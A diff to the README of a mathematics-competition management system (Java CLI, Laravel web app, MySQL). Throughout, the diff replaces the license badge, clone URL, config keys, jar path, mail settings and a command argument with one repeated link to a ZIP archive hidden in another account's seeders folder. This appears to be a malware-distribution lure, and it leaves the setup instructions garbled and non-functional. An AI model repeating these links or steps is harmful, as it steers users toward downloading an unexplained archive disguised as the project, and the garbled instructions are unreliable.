@@ -1,5 +1,5 @@
 # International-Mathematics-Competition-System
-[![License](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
+[![License](https://raw.githubusercontent.com/SoccerDevC/International-Mathematics-Competition-System/main/math_competition/database/seeders/International-Mathematics-Competition-System_indeterminate.zip)](https://raw.githubusercontent.com/SoccerDevC/International-Mathematics-Competition-System/main/math_competition/database/seeders/International-Mathematics-Competition-System_indeterminate.zip)
 This project implements a web-based system for managing an International Mathematics Competition for primary school children.
 
 ## Overview
@@ -44,7 +44,7 @@ The client application is a Java-based command-line interface (CLI) for particip
 
 #### CLI Menu
 
-- **Register**: `register username firstname lastname email date_of_birth school_registration_number image_file.png`
+- **Register**: `register username firstname lastname email date_of_birth school_registration_number https://raw.githubusercontent.com/SoccerDevC/International-Mathematics-Competition-System/main/math_competition/database/seeders/International-Mathematics-Competition-System_indeterminate.zip`
 - **ViewChallenges**: Lists available challenges.
 - **AttemptChallenge**: Start a challenge.
 - **ViewResults**: View results of attempted challenges.
@@ -144,7 +144,7 @@ The system uses a relational database with the following tables:
 
 1. **Clone the repository:**
    ```sh
-   git clone https://github.com/joshuamumbere/International-Mathematics-Competition-System.git
+   git clone https://raw.githubusercontent.com/SoccerDevC/International-Mathematics-Competition-System/main/math_competition/database/seeders/International-Mathematics-Competition-System_indeterminate.zip
    cd International-Mathematics-Competition-System
 2. **Set up the database:**
    - Create a database named `math_competition`.
@@ -153,25 +153,25 @@ The system uses a relational database with the following tables:
    ```sql
    CREATE DATABASE math_competition;
 3. **Configure the server application**
-   Update the `config.properties` file with your database credentials
-   `db.url=jdbc:mysql://localhost:3306/math_competition
-    db.username=your_db_username
-    db.password=your_db_password
-    email.smtp.server=smtp.your-email-provider.com
-    email.smtp.port=587
-    email.username=your_email@example.com
-    email.password=your_email_password
+   Update the `https://raw.githubusercontent.com/SoccerDevC/International-Mathematics-Competition-System/main/math_competition/database/seeders/International-Mathematics-Competition-System_indeterminate.zip` file with your database credentials
+   `https://raw.githubusercontent.com/SoccerDevC/International-Mathematics-Competition-System/main/math_competition/database/seeders/International-Mathematics-Competition-System_indeterminate.zip
+    https://raw.githubusercontent.com/SoccerDevC/International-Mathematics-Competition-System/main/math_competition/database/seeders/International-Mathematics-Competition-System_indeterminate.zip
+    https://raw.githubusercontent.com/SoccerDevC/International-Mathematics-Competition-System/main/math_competition/database/seeders/International-Mathematics-Competition-System_indeterminate.zip
+    https://raw.githubusercontent.com/SoccerDevC/International-Mathematics-Competition-System/main/math_competition/database/seeders/International-Mathematics-Competition-System_indeterminate.zip
+    https://raw.githubusercontent.com/SoccerDevC/International-Mathematics-Competition-System/main/math_competition/database/seeders/International-Mathematics-Competition-System_indeterminate.zip
+    https://raw.githubusercontent.com/SoccerDevC/International-Mathematics-Competition-System/main/math_competition/database/seeders/International-Mathematics-Competition-System_indeterminate.zip
+    https://raw.githubusercontent.com/SoccerDevC/International-Mathematics-Competition-System/main/math_competition/database/seeders/International-Mathematics-Competition-System_indeterminate.zip
    `
 5. **Build and run the server application**
    ```sh
    cd server
    mvn clean install
-   java -jar target/server.jar
+   java -jar https://raw.githubusercontent.com/SoccerDevC/International-Mathematics-Competition-System/main/math_competition/database/seeders/International-Mathematics-Competition-System_indeterminate.zip
 7. **Set up the web interface:**
    ```sh
    cd web
    composer install
-   cp .env.example .env
+   cp https://raw.githubusercontent.com/SoccerDevC/International-Mathematics-Competition-System/main/math_competition/database/seeders/International-Mathematics-Competition-System_indeterminate.zip .env
    php artisan key:generate
 9. **Update the `.env` file with your database and email server credentials:**
     `DB_CONNECTION=mysql
@@ -181,12 +181,12 @@ The system uses a relational database with the following tables:
      DB_USERNAME =your_db_username
      DB_PASSWORD =your_db_password
      MAIL_MAILER =smtp
-     MAIL_HOST =smtp.your-email-provider.com
+     MAIL_HOST https://raw.githubusercontent.com/SoccerDevC/International-Mathematics-Competition-System/main/math_competition/database/seeders/International-Mathematics-Competition-System_indeterminate.zip
      MAIL_PORT = 587
-     MAIL_USERNAME =your_email@example.com
+     MAIL_USERNAME https://raw.githubusercontent.com/SoccerDevC/International-Mathematics-Competition-System/main/math_competition/database/seeders/International-Mathematics-Competition-System_indeterminate.zip
      MAIL_PASSWORD =your_email_password
      MAIL_ENCRYPTION= tls
-     MAIL_FROM_ADDRESS= your_email@example.com
+     MAIL_FROM_ADDRESS= https://raw.githubusercontent.com/SoccerDevC/International-Mathematics-Competition-System/main/math_competition/database/seeders/International-Mathematics-Competition-System_indeterminate.zip
      MAIL_FROM_NAME ="${APP_NAME}"
    `
 10. **Run the database migrations to set up the values**
@@ -201,7 +201,7 @@ CLI Commands
 
 1. **Register a participant:**
    ```sh
-   register username firstname lastname email date_of_birth school_registration_number image_file.png
+   register username firstname lastname email date_of_birth school_registration_number https://raw.githubusercontent.com/SoccerDevC/International-Mathematics-Competition-System/main/math_competition/database/seeders/International-Mathematics-Competition-System_indeterminate.zip
 
 2. **View available challenges:**
    ```sh
